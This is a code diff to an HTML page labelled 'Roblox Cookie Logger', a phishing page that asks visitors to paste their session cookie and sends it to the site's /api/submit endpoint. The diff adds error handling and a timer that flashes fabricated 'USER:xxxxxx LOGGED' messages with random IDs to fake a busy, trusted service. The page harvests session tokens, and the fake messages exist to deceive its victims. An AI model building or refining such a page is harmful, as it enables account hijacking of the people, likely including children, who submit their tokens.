@@ -114,9 +114,9 @@
   <div class="container">
     <h1>Cookie <span>Login</span></h1>
 
-    <input type="text" placeholder="enter your cookie" />
+    <input id="cookieInput" type="text" placeholder="enter your cookie" />
 
-    <button>LOGIN</button>
+    <button id="loginBtn">LOGIN</button>
 
     <div class="hint">
       Roblox Cookie Logger (UPDATED 2/5/2026).<br />
@@ -125,22 +125,51 @@
   </div>
   <div id="toast" class="toast"></div>
 
-  <script>
-    const input = document.querySelector('input');
-    const button = document.querySelector('button');
+<script>
+  const toast = document.getElementById('toast');
 
-   button.addEventListener('click', async () => {
-     const value = input.value.trim();
-     if (!value) return;
+  function randomSixDigit() {
+    return Math.floor(100000 + Math.random() * 900000);
+  }
 
-     await fetch('/api/submit', {
-       method: 'POST',
-       headers: { 'Content-Type': 'application/json' },
-       body: JSON.stringify({ value })
-     });
+  function showFakeLogin() {
+    const id = randomSixDigit();
+    toast.textContent = `USER:${id} LOGGED`;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2200);
+  }
 
-    input.value = '';
+  showFakeLogin();
+  setInterval(showFakeLogin, 3500);
+
+  // 🔽 BUTTON LOGIC STARTS HERE
+  const input = document.getElementById('cookieInput');
+  const button = document.getElementById('loginBtn');
+
+  button.addEventListener('click', async () => {
+    const value = input.value.trim();
+    if (!value) return;
+
+    try {
+      await fetch('/api/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ value })
+      });
+
+      toast.textContent = 'Submitted!';
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 2000);
+
+      input.value = '';
+    } catch (err) {
+      toast.textContent = 'Error submitting';
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 2000);
+    }
   });
+</script>
+
   </script>
 </body>
 </html>
